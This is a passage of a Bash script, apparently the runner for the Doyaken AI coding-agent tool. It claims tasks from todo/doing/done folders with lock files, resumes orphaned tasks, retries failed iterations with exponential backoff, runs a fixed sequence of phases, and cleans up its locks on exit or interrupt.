    log_info "Auto-resuming orphaned task (AGENT_NO_PROMPT=1): $task_id"
    return 0
  fi

  # Check if we have a tty for interactive prompting
  if ! [ -t 0 ]; then
    log_info "Auto-resuming orphaned task (non-interactive): $task_id"
    return 0
  fi

  echo ""
  log_warn "Found orphaned task in doing/"
  echo "  Task: $task_id"
  case "$orphan_reason" in
    nolock)
      echo "  Reason: No lock file (previous run may have crashed)"
      ;;
    stale:*)
      local prev_agent="${orphan_reason#stale:}"
      echo "  Reason: Stale lock from $prev_agent (process no longer running)"
      ;;
    locked:*)
      local prev_agent="${orphan_reason#locked:}"
      echo "  Reason: Locked by $prev_agent (may be abandoned)"
      ;;
  esac
  echo ""
  echo "  Resume this task? [Y/n] (auto-yes in 60s)"

  local response=""
  local timeout=60

  # Read with timeout
  if read -r -t "$timeout" response 2>/dev/null; then
    # User provided input
    case "$response" in
      [nN]|[nN][oO])
        log_info "User declined to resume orphaned task: $task_id"
        return 1
        ;;
      *)
        log_info "User chose to resume orphaned task: $task_id"
        return 0
        ;;
    esac
  else
    # Timeout - default to yes
    echo ""
    log_info "Timeout - auto-resuming orphaned task: $task_id"
    return 0
  fi
}

# Move a task from doing/ back to todo/, clearing locks and assignment
move_task_to_todo() {
  local task_file="$1"
  local task_id
  task_id=$(get_task_id_from_file "$task_file")

  # Remove any existing lock
  local lock_file
  lock_file=$(get_lock_file "$task_id")
  if [ -f "$lock_file" ]; then
    rm -f "$lock_file"
    log_heal "Removed stale lock for $task_id"
  fi

  # Clear assignment metadata
  unassign_task "$task_file"

  # Move to todo/
  local todo_dir new_path
  todo_dir=$(get_task_folder "todo")
  new_path="$todo_dir/$(basename "$task_file")"
  mv "$task_file" "$new_path"

  log_info "Moved declined task back to todo: $task_id"

  # Commit the move
  commit_task_files "chore: Move orphaned task back to todo $task_id" "$task_id"
}

get_next_available_task() {
  # 1. First check for OUR doing task (we have valid lock)
  local our_doing
  our_doing=$(get_doing_task_for_agent) || true
  if [ -n "$our_doing" ]; then
    echo "$our_doing"
    return 0
  fi

  # 2. Check todo/ for available tasks
  local todo_dir
  todo_dir=$(get_task_folder "todo")
  for file in $(find "$todo_dir" -maxdepth 1 -name "*.md" 2>/dev/null | sort); do
    [ -f "$file" ] || continue
    local task_id
    task_id=$(get_task_id_from_file "$file")

    if ! is_task_locked "$task_id"; then
      echo "$file"
      return 0
    else
      log_info "Skipping $task_id (locked by another agent)"
    fi
  done

  # 3. Check for orphaned tasks in doing/ (no lock, stale lock, or different agent's lock)
  local orphan_result orphan_file orphan_reason
  orphan_result=$(find_orphaned_doing_task) || true
  if [ -n "$orphan_result" ]; then
    # Parse result: "filepath reason"
    orphan_file="${orphan_result%% *}"
    orphan_reason="${orphan_result#* }"

    local orphan_task_id
    orphan_task_id=$(get_task_id_from_file "$orphan_file")

    # Prompt user (or auto-resume in non-interactive mode)
    if prompt_orphan_resume "$orphan_task_id" "$orphan_reason"; then
      # User wants to resume - clear stale lock if any and acquire our lock
      local lock_file
      lock_file=$(get_lock_file "$orphan_task_id")
      if [ -f "$lock_file" ]; then
        rm -f "$lock_file"
        log_heal "Cleared stale/orphan lock for $orphan_task_id"
      fi

      if acquire_lock "$orphan_task_id"; then
        log_info "Resuming orphaned task: $orphan_task_id"
        echo "$orphan_file"
        return 0
      else
        log_warn "Failed to acquire lock for orphaned task - another agent may have claimed it"
      fi
    else
      # User declined - move task back to todo
      move_task_to_todo "$orphan_file"
      # Continue looking (recursively check for more orphans or other tasks)
      get_next_available_task
      return $?
    fi
  fi

  return 1
}

show_task_summary() {
  log_info "Task Summary:"
  echo "  - Blocked: $(count_tasks blocked)"
  echo "  - Todo:    $(count_tasks todo)"
  echo "  - Doing:   $(count_tasks doing)"
  echo "  - Done:    $(count_tasks "done")"
  echo "  - Locked:  $(count_locked_tasks)"
}

# ============================================================================
# Retry Logic with Exponential Backoff
# ============================================================================

calculate_backoff() {
  local attempt="$1"
  local base_delay="$AGENT_RETRY_DELAY"
  local max_delay=60

  local delay=$((base_delay * (2 ** (attempt - 1))))
  if [ "$delay" -gt "$max_delay" ]; then
    delay=$max_delay
  fi

  echo "$delay"
}

run_with_retry() {
  local iteration="$1"
  local max_retries="$AGENT_MAX_RETRIES"
  local attempt=1

  while [ "$attempt" -le "$max_retries" ]; do
    # Check for interrupt before each attempt
    if [ "$INTERRUPTED" = "1" ]; then
      return 130
    fi

    if [ "$attempt" -gt 1 ]; then
      local backoff
      backoff=$(calculate_backoff "$attempt")
      log_heal "Retry attempt $attempt/$max_retries (waiting ${backoff}s)..."
      sleep "$backoff"
    fi

    if run_agent_iteration "$iteration" "$attempt"; then
      CONSECUTIVE_FAILURES=0
      return 0
    fi

    ((attempt++))
  done

  log_error "All $max_retries retry attempts failed for iteration $iteration"
  log_info "Troubleshooting: check logs in $RUN_LOG_DIR, or increase AGENT_MAX_RETRIES"
  ((CONSECUTIVE_FAILURES++))

  if [ "$CONSECUTIVE_FAILURES" -ge 3 ]; then
    log_heal "Circuit breaker triggered: $CONSECUTIVE_FAILURES consecutive failures"
    log_heal "Pausing for 30 seconds before continuing..."
    log_info "If persistent failures, check API rate limits or task complexity"
    sleep 30
  fi

  return 1
}

# ============================================================================
# Agent Execution
# ============================================================================

run_agent_iteration() {
  local iteration="$1"
  local attempt="${2:-1}"
  local session_id

  session_id="$AGENT_ID-iter$iteration"

  log_header "Task $iteration of $NUM_TASKS (Attempt $attempt)"

  save_session "$session_id" "$iteration" "running"

  show_task_summary

  local task_file
  task_file=$(get_next_available_task) || true

  if [ -z "$task_file" ]; then
    log_info "No available tasks (all locked or empty)"
    log_info "Agent will create one from PROJECT.md or wait for tasks"
  else
    local task_id
    task_id=$(get_task_id_from_file "$task_file")

    if [[ "$task_file" == *"/doing/"* ]]; then
      log_info "Resuming task: $task_id"
      # Refresh assignment to this agent (handles orphan takeover)
      assign_task "$task_file"
    else
      log_info "Picking up task: $task_id"

      if ! acquire_lock "$task_id"; then
        log_warn "Failed to acquire lock for $task_id - another agent got it"
        return 1
      fi

      local new_path doing_dir
      doing_dir=$(get_task_folder "doing")
      new_path="$doing_dir/$(basename "$task_file")"
      mv "$task_file" "$new_path"
      task_file="$new_path"

      assign_task "$task_file"

      commit_task_files "chore: Start task $task_id" "$task_id"
    fi
  fi

  if [ "$AGENT_DRY_RUN" = "1" ]; then
    log_warn "DRY RUN - would execute phases here"
    log_info "Phases: ${PHASES[*]}"
    save_session "$session_id" "$iteration" "dry-run"
    return 0
  fi

  if [ -z "${task_file:-}" ]; then
    log_error "No task file available for phase execution"
    save_session "$session_id" "$iteration" "no-task"
    return 1
  fi

  local task_id
  task_id=$(get_task_id_from_file "$task_file")

  start_heartbeat "$task_file"

  log_step "Running modular phase-based execution..."
  echo "  Task: $task_id"
  echo "  Model: $CURRENT_MODEL"
  echo "  Phases: EXPAND → TRIAGE → PLAN → IMPLEMENT → TEST → DOCS → REVIEW → VERIFY"
  if [ "$AGENT_QUIET" = "1" ]; then
    echo "  Output: quiet"
  elif [ "$AGENT_PROGRESS" != "1" ]; then
    echo "  Output: full stream"
  else
    echo "  Output: progress"
  fi
  echo ""

  local exit_code=0
  run_all_phases "$task_id" "$task_file" || exit_code=$?

  stop_heartbeat

  # Propagate interrupt immediately
  if [ "$exit_code" -eq 130 ] || [ "$INTERRUPTED" = "1" ]; then
    save_session "$session_id" "$iteration" "interrupted"
    return 130
  fi

  if [ "$exit_code" -eq 0 ]; then
    log_success "Task iteration completed successfully"
    save_session "$session_id" "$iteration" "completed"

    reset_model

    local done_file done_dir
    done_dir=$(get_task_folder "done")
    done_file="$done_dir/$(basename "$task_file")"
    if [ -f "$done_file" ]; then
      release_lock "$task_id"
      unassign_task "$done_file"
      commit_task_files "chore: Complete task $task_id" "$task_id"
    fi

    return 0
  else
    log_error "Task iteration failed"
    save_session "$session_id" "$iteration" "failed"
    return 1
  fi
}

# ============================================================================
# Cleanup
# ============================================================================

cleanup() {
  if [ "$INTERRUPTED" = "1" ]; then
    log_info "Interrupted - preserving task state for resume..."

    stop_phase_monitor
    stop_heartbeat

    rm -rf "$LOCKS_DIR/.${AGENT_ID}.active" 2>/dev/null || true

    # Run taskboard regeneration
    local taskboard_script="$DOYAKEN_HOME/lib/taskboard.sh"
    if [ ! -f "$taskboard_script" ]; then
      taskboard_script="$SCRIPTS_DIR/taskboard.sh"
    fi
    if [ -x "$taskboard_script" ]; then
      DOYAKEN_PROJECT="$PROJECT_DIR" "$taskboard_script" 2>/dev/null || true
    fi

    log_info "Task preserved in doing/ - run 'doyaken' to resume"
  else
    log_info "Cleaning up..."

    stop_phase_monitor
    stop_heartbeat

    release_all_locks

    rm -rf "$LOCKS_DIR/.${AGENT_ID}.active" 2>/dev/null || true

    local doing_dir
    doing_dir=$(get_task_folder "doing")
    for file in "$doing_dir"/*.md; do
      [ -f "$file" ] || continue
      if grep -q "$AGENT_ID" "$file" 2>/dev/null; then
        unassign_task "$file"
      fi
    done

    # Run taskboard regeneration
    local taskboard_script="$DOYAKEN_HOME/lib/taskboard.sh"
    if [ ! -f "$taskboard_script" ]; then
      taskboard_script="$SCRIPTS_DIR/taskboard.sh"
    fi
    if [ -x "$taskboard_script" ]; then
      DOYAKEN_PROJECT="$PROJECT_DIR" "$taskboard_script" 2>/dev/null || true
    fi
  fi
}

handle_interrupt() {
  echo ""
  log_warn "Ctrl+C received - shutting down..."
  INTERRUPTED=1

  # Kill background monitors immediately (they now have signal handlers)
  stop_phase_monitor
  stop_heartbeat

  exit 130
}

trap handle_interrupt INT TERM
trap cleanup EXIT

# ============================================================================
# Main
# ============================================================================

main() {
  log_header "Doyaken Agent Runner (Phase-Based)"
  echo ""
  echo "  Project: $PROJECT_DIR"
  echo "  Data: $DATA_DIR"
  echo "  Worker ID: $AGENT_ID"
  echo "  Tasks to run: $NUM_TASKS"
  echo "  AI Agent: $DOYAKEN_AGENT"
  echo "  Model: $DOYAKEN_MODEL"
  echo "  Max retries: $AGENT_MAX_RETRIES per phase"
  echo "  Lock timeout: ${AGENT_LOCK_TIMEOUT}s ($(( AGENT_LOCK_TIMEOUT / 3600 ))h)"
  echo "  Heartbeat: ${AGENT_HEARTBEAT}s ($(( AGENT_HEARTBEAT / 60 ))min)"
  echo "  Phase monitor: every ${PHASE_MONITOR_INTERVAL}s, stall warning at ${PHASE_STALL_THRESHOLD}s"
  if [ "$AGENT_QUIET" = "1" ]; then
    echo "  Output: quiet (no streaming)"
  elif [ "$AGENT_PROGRESS" != "1" ]; then
    echo "  Output: full stream (verbose)"
  else
    echo "  Output: progress (one-line updates)"
  fi
  echo ""
  echo "  Phases:"
  echo "    0. EXPAND    ${TIMEOUT_EXPAND}s  $([ "$SKIP_EXPAND" = "1" ] && echo "[SKIP]" || echo "")"
  echo "    1. TRIAGE    ${TIMEOUT_TRIAGE}s  $([ "$SKIP_TRIAGE" = "1" ] && echo "[SKIP]" || echo "")"
  echo "    2. PLAN      ${TIMEOUT_PLAN}s  $([ "$SKIP_PLAN" = "1" ] && echo "[SKIP]" || echo "")"
  echo "    3. IMPLEMENT ${TIMEOUT_IMPLEMENT}s  $([ "$SKIP_IMPLEMENT" = "1" ] && echo "[SKIP]" || echo "")"
  echo "    4. TEST      ${TIMEOUT_TEST}s  $([ "$SKIP_TEST" = "1" ] && echo "[SKIP]" || echo "")"
  echo "    5. DOCS      ${TIMEOUT_DOCS}s  $([ "$SKIP_DOCS" = "1" ] && echo "[SKIP]" || echo "")"
  echo "    6. REVIEW    ${TIMEOUT_REVIEW}s  $([ "$SKIP_REVIEW" = "1" ] && echo "[SKIP]" || echo "")"
  echo "    7. VERIFY    ${TIMEOUT_VERIFY}s  $([ "$SKIP_VERIFY" = "1" ] && echo "[SKIP]" || echo "")"
  echo ""
  echo "  Log dir: $RUN_LOG_DIR"
  echo ""

  # Check first-run warning (skip if safe mode or already acknowledged)
  if [ "${DOYAKEN_SAFE_MODE:-0}" != "1" ]; then
    check_first_run_warning
  fi

  init_state

  if ! health_check; then
    log_error "Health check failed - aborting"
    exit 1
  fi

  local start_iteration=1
  if load_session; then
    log_heal "Resuming from iteration ${ITERATION:-1}"
    start_iteration="${ITERATION:-1}"
    if [ -n "${LOG_DIR:-}" ] && [ -d "$LOG_DIR" ]; then
      RUN_LOG_DIR="$LOG_DIR"
      log_info "Resuming logs in: $RUN_LOG_DIR"
    fi
  fi

  validate_environment

  local completed=0
  local failed=0
  local skipped=0
  CONSECUTIVE_FAILURES=$(get_consecutive_failures)

  for ((i=start_iteration; i<=NUM_TASKS; i++)); do
    # Check for interrupt before starting next task
    if [ "$INTERRUPTED" = "1" ]; then
      log_warn "Interrupted - stopping task loop"
      break
    fi

    local retry_result=0
    run_with_retry "$i" || retry_result=$?

    if [ "$retry_result" -eq 0 ]; then
      ((completed++))
      # Track for periodic review
      review_tracker_increment > /dev/null 2>&1 || true
    elif [ "$retry_result" -eq 130 ] || [ "$INTERRUPTED" = "1" ]; then
      log_warn "Interrupted - stopping task loop"
      break
    else
      local available
      available=$(get_next_available_task) || true
      if [ -z "$available" ] && [ "$(count_tasks todo)" -eq 0 ]; then
        log_info "No more tasks available - stopping early"
        ((skipped++))
        break
      fi
      ((failed++))
      log_warn "Moving to next task after exhausting retries..."
    fi

    if [ "$i" -lt "$NUM_TASKS" ]; then
      sleep 2
    fi
  done

  if [ "$failed" -eq 0 ]; then
    clear_session
  fi

  log_header "Run Complete"
  echo ""
  echo "  Agent: $AGENT_ID"
  echo "  Project: $PROJECT_DIR"
  echo "  Completed: $completed"
  echo "  Failed: $failed"
  echo "  Skipped: $skipped"
  echo "  Logs: $RUN_LOG_DIR"
  echo ""
  show_task_summary

  if [ "$failed" -gt 0 ]; then
    log_warn "Some tasks failed - run 'doyaken' again to retry"
    exit 1
  fi

  log_success "All tasks completed successfully!"

  # Check if periodic review should be triggered
  if review_tracker_is_enabled && review_tracker_should_trigger; then
    echo ""
    log_info "Periodic review threshold reached ($(review_tracker_status))"
    log_info "Run 'doyaken review' to perform a codebase review"
  fi
}

# ============================================================================
# Entry Point
# ============================================================================

cd "$PROJECT_DIR"

main "$@"
